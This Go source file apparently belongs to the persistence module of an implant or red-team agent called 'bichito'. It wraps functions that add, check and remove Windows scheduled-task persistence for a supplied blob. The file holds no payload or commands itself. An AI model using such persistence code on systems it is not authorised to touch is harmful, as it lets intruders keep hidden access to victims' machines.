// +build schtasks

package persistence

import (
	"bichito/modules/persistence/windows_schtasks"
)


func AddPersistence(jsonPersistence string,blob string) (bool,string){

	err,result := windows_schtasks.AddPersistenceSchtasks(jsonPersistence,blob)
	if err != false {
		return true,result
	}

	return false,"Persisted"
}

func CheckPersistence(jsonPersistence string) (bool,string){

	err,result := windows_schtasks.CheckPersistenceSchtasks(jsonPersistence)
	if err != false {
		return true,result
	}

	return false,result
}


func RemovePersistence(jsonPersistence string) (bool,string){

	err,result := windows_schtasks.RemovePersistenceSchtasks(jsonPersistence)
	if err != false {
		return true,result
	}

	return false,"Persistence Removed"
}